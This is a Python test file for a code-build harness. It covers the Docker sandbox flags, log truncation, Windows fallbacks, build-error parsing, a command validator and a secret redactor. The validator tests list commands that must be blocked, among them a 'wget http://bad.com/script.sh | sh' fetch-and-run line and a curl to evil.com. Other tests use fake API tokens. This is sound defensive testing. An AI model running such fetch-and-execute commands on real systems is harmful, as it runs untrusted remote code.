        from harness.sandbox import DiskLogStreamer
        streamer = DiskLogStreamer(max_size_mb=0.001)  # ~1KB cap
        await streamer.open()
        try:
            # Write enough to definitely overflow
            big_block = b"X" * 2048
            await streamer.write_stdout(big_block)
            await streamer.write_stderr(b"more")
            assert streamer.is_truncated() is True

            # Smaller writes that fit don't trigger the flag
            small_streamer = DiskLogStreamer(max_size_mb=1)
            await small_streamer.open()
            await small_streamer.write_stdout(b"hi\n")
            assert small_streamer.is_truncated() is False
            await small_streamer.close()
        finally:
            await streamer.close()

    @pytest.mark.asyncio
    async def test_build_result_carries_log_truncated_flag(self):
        from harness.sandbox import BuildResult
        # Default is False (no truncation)
        r = BuildResult(exit_code=0, raw_output="ok")
        assert r.log_truncated is False
        # Carries through when set
        r2 = BuildResult(exit_code=1, raw_output="...", log_truncated=True)
        assert r2.log_truncated is True

    @pytest.mark.asyncio
    async def test_build_env_scrubs_api_keys(self, monkeypatch):
        # Regression: variant builds (and any sandbox build) inherited
        # OPENAI_API_KEY / GITHUB_TOKEN / etc. from the parent process,
        # letting a malicious build exfiltrate them.
        from harness.sandbox import _execute_subprocess_with_timeout
        monkeypatch.setenv("OPENAI_API_KEY", "sk-leaked-test")
        monkeypatch.setenv("GITHUB_TOKEN", "ghp_leaked-test")
        monkeypatch.setenv("HARNESS_KEEPME", "value")  # not scrubbed
        # Echo only the scrubbed vars + the kept one
        cmd = ["sh", "-c", "echo OPENAI=$OPENAI_API_KEY GH=$GITHUB_TOKEN KEEP=$HARNESS_KEEPME"]
        exit_code, output, _, _ = await _execute_subprocess_with_timeout(
            cmd, timeout_seconds=10, log_buffer_mode="memory"
        )
        assert exit_code == 0
        assert "sk-leaked-test" not in output
        assert "ghp_leaked-test" not in output
        assert "KEEP=value" in output  # unrelated vars survive

    def test_docker_cmd_default_is_read_only_with_writable_home(self, monkeypatch):
        # Default DockerBackend keeps --read-only for defense in depth, and
        # supplies a tmpfs at /root so pip's --user fallback can land without
        # [Errno 30] WHEN the container runs as root (i.e. no --user passed).
        # When --user is passed (host-user mode), HOME is redirected to /tmp
        # so no /root tmpfs is needed; covered by the host-user tests below.
        from harness.sandbox import DockerBackend
        # Pin to root-in-container mode for this test.
        monkeypatch.setattr(os, "getuid", lambda: 0)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        assert "--read-only" in cmd
        # /tmp tmpfs is always present; /root tmpfs comes with --read-only.
        tmpfs_targets = [cmd[i + 1] for i, a in enumerate(cmd) if a == "--tmpfs"]
        assert "/tmp:exec" in tmpfs_targets
        assert "/root:exec" in tmpfs_targets

    def test_docker_cmd_drops_read_only_when_root_writable_requested(self, monkeypatch):
        # When the toolchain adapter detects an install command it flips
        # read_only_root=False. The docker command must then drop both
        # --read-only AND the /root tmpfs (root FS is writable now).
        from harness.sandbox import DockerBackend
        monkeypatch.setattr(os, "getuid", lambda: 0)
        backend = DockerBackend(image="python:3.12-slim", read_only_root=False)
        cmd = backend._build_docker_command(
            "pip install -e .", "/work", allow_network=True,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        assert "--read-only" not in cmd
        tmpfs_targets = [cmd[i + 1] for i, a in enumerate(cmd) if a == "--tmpfs"]
        # /tmp tmpfs always stays; /root tmpfs only gets added with read-only
        assert "/tmp:exec" in tmpfs_targets
        assert "/root:exec" not in tmpfs_targets

    def test_sandbox_executor_threads_read_only_root_into_docker(self):
        # SandboxExecutor must forward sandbox_config["read_only_root"] to
        # DockerBackend so the auto-adapter's flip actually reaches the
        # container.
        from harness.sandbox import SandboxExecutor, DockerBackend
        executor = SandboxExecutor(
            workspace_path="/work",
            sandbox_config={
                "backend": "docker",
                "docker_image": "python:3.12-slim",
                "read_only_root": False,
            },
        )
        assert isinstance(executor.backend, DockerBackend)
        assert executor.backend.read_only_root is False

    def test_docker_cmd_suppresses_pyc_by_default(self, monkeypatch):
        # The Docker container runs as UID 0 and bind-mounts the workspace
        # rw, so pytest's __pycache__ writes would land root-owned on the
        # host. Default env strips bytecode emission AND redirects whatever
        # slips through to the container's /tmp tmpfs.
        from harness.sandbox import DockerBackend
        # Force Linux + non-root host so the trailer is active.
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        env_pairs = [cmd[i + 1] for i, a in enumerate(cmd) if a == "-e"]
        assert "PYTHONDONTWRITEBYTECODE=1" in env_pairs
        assert "PYTHONPYCACHEPREFIX=/tmp/pycache" in env_pairs

    def test_docker_cmd_extra_env_overrides_pyc_defaults(self, monkeypatch):
        # Speculative's _build_variant_cache_env sets its own
        # PYTHONPYCACHEPREFIX per-variant. The default must NOT clobber it.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[],
            extra_env={"PYTHONPYCACHEPREFIX": "/tmp/spec/v0/pycache"},
            timeout_seconds=60,
        )
        env_pairs = [cmd[i + 1] for i, a in enumerate(cmd) if a == "-e"]
        # Speculative override wins
        assert "PYTHONPYCACHEPREFIX=/tmp/spec/v0/pycache" in env_pairs
        assert "PYTHONPYCACHEPREFIX=/tmp/pycache" not in env_pairs
        # The non-overridden default still applies
        assert "PYTHONDONTWRITEBYTECODE=1" in env_pairs

    def test_docker_cmd_wraps_shell_with_ownership_restore(self, monkeypatch):
        # When the container falls back to running as root (e.g. on macOS
        # Docker Desktop where Linux UID mapping isn't useful, or when the
        # host is itself root), the shell entrypoint must be wrapped with a
        # `find -uid 0 -exec chown` trailer so files the in-container root
        # process wrote into the bind-mount land owned by the host user.
        # When the container runs as a non-root host UID via --user, every
        # write is host-owned from the start and the trailer is skipped
        # (covered by test_docker_cmd_host_user_mode_*).
        from harness.sandbox import DockerBackend
        # Force the root-in-container path by reporting the host as macOS,
        # which gates run_as_host_user off (Docker Desktop FUSE already
        # remaps ownership). Then assert the chown safety net is wired.
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Darwin")
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        # macOS path doesn't add the chown trailer, so we'd skip the
        # assertion. Instead pin Linux host = root to confirm the
        # trailer fires when the container is launched as root.
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 0)
        monkeypatch.setattr(os, "getgid", lambda: 0)
        # ...but the host-user mode logic also bails when host uid==0
        # (chowning to 0:0 is a no-op), so to actually see the trailer we
        # need a non-root host and explicit opt-out of the --user path.
        # The simplest construction: disable restore_workspace_ownership=False
        # would skip BOTH, so we monkeypatch _should_run_as_host_user
        # directly to simulate "couldn't determine host UID" → falls back
        # to root-in-container with the chown trailer enabled.
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        monkeypatch.setattr(
            DockerBackend, "_should_run_as_host_user", lambda self: False,
        )
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        assert cmd[-3:-1] == ["sh", "-c"]
        payload = cmd[-1]
        assert "pytest -q" in payload
        assert "find /work -uid 0 -exec chown 1000:1000" in payload
        assert "exit $__rc" in payload

    def test_docker_cmd_no_trailer_when_restore_disabled(self, monkeypatch):
        # Operators on rootless docker / podman where the user-namespace
        # remapping already handles ownership can opt out via
        # restore_workspace_ownership=False.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(
            image="python:3.12-slim", restore_workspace_ownership=False,
        )
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        assert "chown" not in payload
        assert payload == "pytest -q"

    def test_docker_cmd_no_trailer_on_non_linux_host(self, monkeypatch):
        # On macOS / Windows, Docker Desktop's FUSE layer already remaps
        # ownership; the trailer is unnecessary and would slow builds.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Darwin")
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        assert "chown" not in payload

    def test_docker_cmd_no_trailer_when_host_is_root(self, monkeypatch):
        # When the host user is already root, chowning to 0:0 is a no-op.
        # Skip the find walk entirely.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 0)
        monkeypatch.setattr(os, "getgid", lambda: 0)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        assert "chown" not in payload

    def test_docker_cmd_trailer_preserves_user_exit_code(self, monkeypatch):
        # The trailer must capture $? BEFORE chown and re-exit with it, so
        # a build failure isn't masked by the chown succeeding. Asserted on
        # the root-in-container path; the host-user path doesn't use a
        # trailer at all.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        monkeypatch.setattr(
            DockerBackend, "_should_run_as_host_user", lambda self: False,
        )
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "exit 1", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        # Sequence: ( user_cmd ); __rc=$?; chown ...; exit $__rc
        assert payload.index("__rc=$?") < payload.index("chown")
        assert payload.endswith("exit $__rc")

    def test_docker_cmd_workspace_path_is_shell_quoted(self, monkeypatch):
        # A workspace path with spaces / special chars must survive the
        # sh -c expansion without the trailer breaking. Asserted on the
        # root-in-container path because that's where the workspace path
        # is interpolated into the chown trailer.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        monkeypatch.setattr(
            DockerBackend, "_should_run_as_host_user", lambda self: False,
        )
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/path with spaces/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        # shlex.quote wraps in single quotes
        assert "'/path with spaces/work'" in payload

    def test_docker_cmd_host_user_mode_passes_user_flag(self, monkeypatch):
        # When the host is Linux + non-root, the container must launch with
        # --user $UID:$GID so the build runs as the host user (no more
        # root-owned __pycache__ on the bind-mount, no more pip "running as
        # root" warning).
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        # --user flag with the host UID:GID
        assert "--user" in cmd
        assert cmd[cmd.index("--user") + 1] == "1000:1000"

    def test_docker_cmd_host_user_mode_sets_pip_user_env(self, monkeypatch):
        # In host-user mode the container's pip must default to per-user
        # install mode so `pip install pkg` doesn't EACCES on
        # /usr/local/lib/.../site-packages. HOME points at the writable /tmp
        # tmpfs so the per-user dir is creatable; PATH is rewritten so the
        # entry-point scripts pip lands in $HOME/.local/bin (pytest, ruff,
        # mypy) are findable in later steps of the same build command.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        env_pairs = [cmd[i + 1] for i, a in enumerate(cmd) if a == "-e"]
        assert "PIP_USER=1" in env_pairs
        assert "PIP_ROOT_USER_ACTION=ignore" in env_pairs
        assert "HOME=/tmp/builder-home" in env_pairs
        # PATH must include the host-user's local bin dir BEFORE the
        # standard locations so pytest from `pip install --user pytest` wins.
        path_entries = [v for v in env_pairs if v.startswith("PATH=")]
        assert len(path_entries) == 1
        assert path_entries[0].startswith("PATH=/tmp/builder-home/.local/bin:")

    def test_docker_cmd_host_user_mode_ensures_home_exists(self, monkeypatch):
        # The wrapped shell command must `mkdir -p $HOME` before the user
        # command so pip's per-user install doesn't fail trying to create
        # /tmp/builder-home/.local/lib/... inside a missing parent.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pip install pytest && pytest -q", "/work", allow_network=True,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        assert payload.startswith('mkdir -p "$HOME" && ')
        assert "pip install pytest && pytest -q" in payload

    def test_docker_cmd_host_user_mode_skips_chown_trailer(self, monkeypatch):
        # With --user passing the host UID, every write is host-owned from
        # the start. The `find -uid 0 -exec chown` trailer becomes a
        # redundant find-walk over the entire workspace; skip it.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        payload = cmd[-1]
        assert "chown" not in payload
        assert "find /work -uid 0" not in payload

    def test_docker_cmd_host_user_mode_skips_root_tmpfs(self, monkeypatch):
        # When --user is passed, HOME points at /tmp/builder-home (already
        # covered by the existing /tmp:exec tmpfs). The container never
        # writes to /root so the separate /root:exec tmpfs that's added in
        # root-in-container mode is no longer needed and would just consume
        # memory.
        from harness.sandbox import DockerBackend
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        monkeypatch.setattr(os, "getuid", lambda: 1000)
        monkeypatch.setattr(os, "getgid", lambda: 1000)
        backend = DockerBackend(image="python:3.12-slim")
        cmd = backend._build_docker_command(
            "pytest -q", "/work", allow_network=False,
            cache_mounts=[], extra_env={}, timeout_seconds=60,
        )
        tmpfs_targets = [cmd[i + 1] for i, a in enumerate(cmd) if a == "--tmpfs"]
        assert "/tmp:exec" in tmpfs_targets
        assert "/root:exec" not in tmpfs_targets

    def test_sandbox_executor_threads_restore_workspace_ownership(self):
        # SandboxExecutor must forward sandbox_config["restore_workspace_ownership"]
        # to DockerBackend so operators can opt out via config.
        from harness.sandbox import SandboxExecutor, DockerBackend
        executor = SandboxExecutor(
            workspace_path="/work",
            sandbox_config={
                "backend": "docker",
                "docker_image": "python:3.12-slim",
                "restore_workspace_ownership": False,
            },
        )
        assert isinstance(executor.backend, DockerBackend)
        assert executor.backend.restore_workspace_ownership is False

    # ------------------------------------------------------------------
    # Windows compatibility — three regression nets for the POSIX-only
    # paths in sandbox.py. Each test simulates Windows via monkeypatch
    # so the suite still runs entirely on Linux/macOS hosts. The same
    # functions on the POSIX side are exercised by every OTHER test in
    # this class, so the unchanged-on-Linux contract is verified by
    # those tests staying green without modification.
    # ------------------------------------------------------------------

    def test_kill_process_group_falls_back_to_proc_kill_on_windows(self, monkeypatch):
        # On Windows os.killpg and os.getpgid don't exist; the old guard
        # only caught ProcessLookupError/OSError, so an unguarded killpg
        # call would crash the entire harness with an AttributeError when
        # a build timed out. Now the hasattr() check routes through the
        # cross-platform proc.kill() fallback.
        from harness.sandbox import _kill_process_group

        # Simulate Windows: remove killpg from the os module the function
        # sees. monkeypatch restores it after the test.
        monkeypatch.delattr(os, "killpg", raising=False)

        class _FakeProc:
            def __init__(self):
                self.killed = False
            def kill(self):
                self.killed = True

        fake = _FakeProc()
        # Must not raise — and must invoke the proc.kill() fallback.
        _kill_process_group(pgid=4242, proc=fake)  # type: ignore[arg-type]
        assert fake.killed, (
            "Windows fallback didn't call proc.kill() — the timeout path "
            "would crash with AttributeError instead of cleaning up."
        )

    def test_docker_mount_path_returns_unchanged_on_linux(self, monkeypatch):
        # On Linux/macOS the helper must be a pure pass-through so the
        # existing docker-argv assertions in this test class stay valid.
        from harness.sandbox import _docker_mount_path
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")
        assert _docker_mount_path("/work") == "/work"
        assert _docker_mount_path("/home/akhila/mywork/projects/foo") == "/home/akhila/mywork/projects/foo"

    def test_docker_mount_path_converts_windows_drive_letter(self, monkeypatch):
        # Windows path C:\Users\foo\ws must become /c/Users/foo/ws so
        # Docker Desktop's CLI doesn't choke on the ":" in "C:" being
        # mistaken for the host/container mount separator.
        from harness.sandbox import _docker_mount_path
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Windows")
        assert _docker_mount_path("C:\\Users\\foo\\ws") == "/c/Users/foo/ws"
        assert _docker_mount_path("D:\\src\\app") == "/d/src/app"
        # Lower-case drive letter regardless of input case.
        assert _docker_mount_path("c:\\users\\foo") == "/c/users/foo"
        # Already-POSIX path (Git Bash / WSL) passes through with slash flip.
        assert _docker_mount_path("/mnt/c/foo") == "/mnt/c/foo"

    def test_bare_backend_uses_cmd_c_on_windows(self, monkeypatch):
        # BareBackend defaults to ["sh", "-c", ...] on POSIX; on Windows
        # there's no sh on PATH, so we use cmd /c with cd /d (the /d
        # switch crosses drive letters). Verify the constructed argv.
        from harness.sandbox import BareBackend

        # Capture the argv without actually spawning a subprocess. The
        # real run() awaits a subprocess; we just need to know what cmd
        # would be passed to _execute_subprocess_with_timeout.
        captured: dict[str, list[str]] = {}
        async def _fake_exec(cmd, timeout_seconds, extra_env=None):
            captured["cmd"] = cmd
            return (0, "", False, False)

        monkeypatch.setattr(
            "harness.sandbox._execute_subprocess_with_timeout", _fake_exec,
        )
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Windows")

        import asyncio
        backend = BareBackend()
        asyncio.run(backend.run(
            command="echo hello",
            workspace_path="C:\\work",
            timeout_seconds=60,
        ))
        assert captured["cmd"][:2] == ["cmd", "/c"], (
            f"Expected cmd /c on Windows, got {captured['cmd'][:2]!r}"
        )
        assert 'cd /d "C:\\work"' in captured["cmd"][2]
        assert "echo hello" in captured["cmd"][2]

    def test_bare_backend_uses_sh_on_linux(self, monkeypatch):
        # Regression-net partner for the test above: on Linux the
        # constructed argv MUST still be ["sh", "-c", ...] so the
        # existing POSIX behaviour is unchanged byte-for-byte.
        from harness.sandbox import BareBackend

        captured: dict[str, list[str]] = {}
        async def _fake_exec(cmd, timeout_seconds, extra_env=None):
            captured["cmd"] = cmd
            return (0, "", False, False)

        monkeypatch.setattr(
            "harness.sandbox._execute_subprocess_with_timeout", _fake_exec,
        )
        monkeypatch.setattr("harness.sandbox.platform.system", lambda: "Linux")

        import asyncio
        backend = BareBackend()
        asyncio.run(backend.run(
            command="echo hello",
            workspace_path="/tmp/work",
            timeout_seconds=60,
        ))
        assert captured["cmd"][:2] == ["sh", "-c"], (
            f"Linux MUST still use ['sh', '-c', ...]; got {captured['cmd'][:2]!r}"
        )
        assert captured["cmd"][2] == "cd '/tmp/work' && echo hello"

    def test_docker_is_available_distinguishes_failure_modes(self, monkeypatch, caplog):
        # Regression: docker info failure used to just return False with no
        # signal whether the daemon was down or perms were wrong.
        from harness.sandbox import DockerBackend
        import subprocess as sp

        backend = DockerBackend()

        class FakeResult:
            def __init__(self, returncode, stderr):
                self.returncode = returncode
                self.stderr = stderr
                self.stdout = ""

        # Pretend docker binary exists
        monkeypatch.setattr("shutil.which", lambda _: "/usr/bin/docker")

        # Case 1: permission denied
        monkeypatch.setattr(sp, "run", lambda *a, **kw: FakeResult(
            1, "permission denied while trying to connect to the Docker daemon socket"
        ))
        with caplog.at_level("ERROR"):
            assert backend.is_available() is False
        assert any("docker' group" in r.message for r in caplog.records)
        caplog.clear()

        # Case 2: daemon not running
        monkeypatch.setattr(sp, "run", lambda *a, **kw: FakeResult(
            1, "Cannot connect to the Docker daemon"
        ))
        with caplog.at_level("WARNING"):
            assert backend.is_available() is False
        assert any("daemon is not running" in r.message for r in caplog.records)


class TestDiagnosticParsing:

    def test_parse_go_diagnostics(self):
        from harness.sandbox import _parse_go_diagnostics
        output = "src/main.go:10:5: undefined: xyz\nother.go:3:1: syntax error\n"
        diags = _parse_go_diagnostics(output)
        assert len(diags) == 2
        assert diags[0].file == "src/main.go"
        assert diags[0].line == 10
        assert diags[0].column == 5
        assert "undefined" in diags[0].message

    def test_parse_generic_diagnostics(self):
        from harness.sandbox import _parse_generic_diagnostics
        output = "src/main.c:10:5: error: expected ';' before '}'\n"
        diags = _parse_generic_diagnostics(output, "/workspace")
        assert len(diags) == 1
        assert diags[0].file.endswith("src/main.c")

    def test_filter_critical_errors(self):
        from harness.sandbox import filter_critical_errors
        output = "info: compiling\n   Compiling foo v1.0\nerror: expected ';'\n  --> src/main.rs:10:5\n   |\n10 |     let x\n   |"
        filtered = filter_critical_errors(output)
        assert "error" in filtered.lower()

    def test_filter_no_errors_returns_tail(self):
        from harness.sandbox import filter_critical_errors
        output = "\n".join(f"line {i}" for i in range(100))
        filtered = filter_critical_errors(output)
        lines = filtered.splitlines()
        assert 1 <= len(lines) <= 50

    def test_is_critical_line(self):
        from harness.sandbox import _is_critical_line
        assert _is_critical_line("error: expected identifier")
        assert _is_critical_line("fatal error: something went wrong")
        assert _is_critical_line("SIGSEGV: segmentation violation")
        assert not _is_critical_line("info: compiling module A")

    def test_extract_diagnostics_routes_python_through_registry(self):
        # Regression: the legacy extract_diagnostics() only handled
        # rust/gcc/go/generic and returned 0 diagnostics for any Python
        # error (pytest, ModuleNotFoundError, etc.), even though
        # parser_registry.PythonParser is registered and capable of
        # parsing it. Build failures were going to the repair LLM blind.
        from harness.sandbox import extract_diagnostics
        py_traceback = (
            "Traceback (most recent call last):\n"
            '  File "/workspace/app/main.py", line 42, in <module>\n'
            "    from missing import thing\n"
            "ModuleNotFoundError: No module named 'missing'\n"
        )
        diags = extract_diagnostics(py_traceback, "python3 -m pytest -q", "/workspace")
        assert len(diags) == 1, "Python traceback should produce 1 structured diagnostic"
        assert diags[0].error_code == "ModuleNotFoundError"
        assert "missing" in diags[0].message
        assert diags[0].file.endswith("main.py")

    def test_pytest_conftest_import_failure(self):
        # Regression: pytest replaces the standard "Traceback ... File ..."
        # block with its own short layout when conftest.py fails to import,
        # exiting with code 4. Without recognizing this layout, the repair
        # loop ran 5 attempts on tests/conftest.py with zero diagnostics
        # (session log: a864556d, 2026-06-11).
        from harness.sandbox import extract_diagnostics
        output = (
            "ImportError while loading conftest '/workspace/tests/conftest.py'.\n"
            "tests/conftest.py:1: in <module>\n"
            "    import aiosqlite\n"
            "E   ModuleNotFoundError: No module named 'aiosqlite'\n"
        )
        diags = extract_diagnostics(output, "python3 -m pytest -q", "/workspace")
        assert len(diags) >= 1
        primary = next(d for d in diags if d.error_code == "ModuleNotFoundError")
        assert primary.file.endswith("conftest.py")
        assert primary.line == 1
        assert "aiosqlite" in primary.message

    def test_pytest_assertion_failure(self):
        # pytest's normal --tb=short failure output uses its own frame layout
        # AND a summary line at the bottom. We should produce at least one
        # diagnostic with the failing test file/line.
        from harness.sandbox import extract_diagnostics
        output = (
            "F                                                                        [100%]\n"
            "=================================== FAILURES ===================================\n"
            "___________________________________ test_one ___________________________________\n"
            "\n"
            "    def test_one():\n"
            "        x = 1\n"
            ">       assert x == 2\n"
            "E       assert 1 == 2\n"
            "\n"
            "tests/test_x.py:3: AssertionError\n"
            "=========================== short test summary info ============================\n"
            "FAILED tests/test_x.py::test_one - assert 1 == 2\n"
            "1 failed in 0.01s\n"
        )
        diags = extract_diagnostics(output, "pytest -q", "/workspace")
        assert len(diags) >= 1
        files = [d.file for d in diags]
        assert any(f.endswith("test_x.py") for f in files)
        assert any(d.error_code == "AssertionError" for d in diags)

    def test_pytest_summary_error_row(self):
        # ERROR rows in the summary section (collection errors without a
        # matching per-failure block in the captured slice) must still
        # surface a diagnostic so the LLM knows which file to repair.
        from harness.sandbox import extract_diagnostics
        output = (
            "=========================== short test summary info ============================\n"
            "ERROR tests/conftest.py - ModuleNotFoundError: No module named 'aiosqlite'\n"
            "!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!\n"
        )
        diags = extract_diagnostics(output, "pytest -q", "/workspace")
        assert len(diags) == 1
        assert diags[0].file.endswith("conftest.py")
        assert diags[0].error_code == "ModuleNotFoundError"
        assert "aiosqlite" in diags[0].message

    def test_diagnostic_object_to_dict(self):
        from harness.sandbox import DiagnosticObject
        d = DiagnosticObject(file="test.py", line=10, column=5, severity="error",
                             error_code="E001", message="test error", semantic_context="here")
        d_dict = d.to_dict()
        assert d_dict["file"] == "test.py"
        assert d_dict["severity"] == "error"
        assert d_dict["message"] == "test error"

    def test_build_result_defaults(self):
        from harness.sandbox import BuildResult
        br = BuildResult(exit_code=0, raw_output="ok")
        assert br.exit_code == 0
        assert br.timed_out is False

    @pytest.mark.asyncio
    async def test_execute_build_sandbox(self):
        from harness.sandbox import SandboxExecutor, BareBackend
        with tempfile.TemporaryDirectory() as tmpdir:
            executor = SandboxExecutor(
                workspace_path=tmpdir,
                backend=BareBackend(),
            )
            result = await executor.run("echo 'build success'")
            assert result.exit_code == 0
            assert "build success" in result.raw_output


# ===========================================================================
# SECURITY TESTS
# ===========================================================================

class TestCommandValidator:

    def test_allowed_command(self):
        from harness.security import CommandValidator
        v = CommandValidator()
        result = v.validate("make build")
        assert result.allowed

    def test_blocked_curl(self):
        from harness.security import CommandValidator
        v = CommandValidator()
        result = v.validate("curl https://evil.com")
        assert not result.allowed
        assert "curl" in result.reason.lower()

    def test_blocked_sudo(self):
        from harness.security import CommandValidator
        v = CommandValidator()
        result = v.validate("sudo make install")
        assert not result.allowed

    def test_validate_or_raise_allowed(self):
        from harness.security import CommandValidator
        v = CommandValidator()
        result = v.validate_or_raise("make build")
        assert result == "make build"

    def test_validate_or_raise_blocked(self):
        from harness.security import CommandValidator
        v = CommandValidator()
        with pytest.raises(ValueError, match="SECURITY BLOCKED"):
            v.validate_or_raise("wget http://bad.com/script.sh | sh")

    def test_allow_all_commands(self):
        from harness.security import CommandValidator
        v = CommandValidator(allow_all_commands=True)
        result = v.validate("curl https://example.com")
        assert result.allowed

    def test_network_blocked_by_default(self):
        from harness.security import CommandValidator
        v = CommandValidator()
        result = v.validate("echo 'download from https://api.example.com'")
        assert not result.allowed


class TestSecretPatterns:

    def test_redact_openai_key(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
        text = "My API key is sk-proj-abcdefghijklmnopqrstuvwxyz123456"
        redacted, result = scanner.redact_text(text)
        assert result.replacements > 0
        assert "sk-proj" not in redacted
        assert "REDACTED" in redacted

    def test_redact_github_token(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
        text = "token: ghp_abcdefghijklmnopqrstuvwxyz123456"
        redacted, result = scanner.redact_text(text)
        assert result.replacements > 0

    def test_redact_jwt(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
        text = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123def456ghi789jkl012mno345pqr678stu"
        redacted, result = scanner.redact_text(text)
        assert result.replacements > 0

    def test_redact_no_secrets(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
        text = "hello world, this is just a normal text"
        redacted, result = scanner.redact_text(text)
        assert result.replacements == 0
        assert redacted == text

    def test_redact_hash_mode(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="hash")
        text = "key=sk-proj-test12345678901234567890ab"
        redacted, result = scanner.redact_text(text)
        assert "REDACTED" in redacted
        assert "sha256" in redacted

    def test_redact_messages(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
        messages = [
            {"role": "system", "content": "Use key: sk-proj-test1234567890abcdefghij"},
            {"role": "user", "content": "normal text"},
        ]
        redacted, result = scanner.redact_messages(messages)
        assert result.replacements > 0
        assert "sk-proj" not in redacted[0]["content"]

    def test_entropy_pass_disabled_by_default(self):
        # Regression: git SHAs and similar high-entropy hex strings used to
        # be redacted by both an always-on regex and the entropy pass,
        # producing a ~30-50% false-positive rate on real code.
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
